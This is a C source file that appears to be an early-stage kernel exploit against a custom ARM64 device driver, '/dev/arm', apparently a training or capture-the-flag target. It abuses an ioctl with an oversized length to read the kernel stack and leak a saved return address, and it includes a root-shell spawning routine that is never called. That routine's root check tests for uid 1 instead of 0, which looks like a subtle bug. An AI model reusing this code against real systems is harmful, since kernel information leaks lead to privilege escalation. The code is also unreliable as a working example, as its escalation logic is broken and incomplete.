#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024

typedef struct read_write_stack{
	unsigned long size;
	unsigned long *buf;
} read_write_stack;

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 1){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

int main(){
	int fd;
	long ret;
    unsigned long *buf = (unsigned long*)malloc(sizeof(unsigned long) * 512);
    read_write_stack messenger;
    messenger.buf = buf;

	printf("[+] Opening device file...\n");
	fd = open("/dev/arm", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

    messenger.size = 608;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)&messenger);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		exit(-1);
	}

	printf("[+] x30 of outer function: 0x%lx\n", buf[66]);

	free(buf);
	return 0;
}
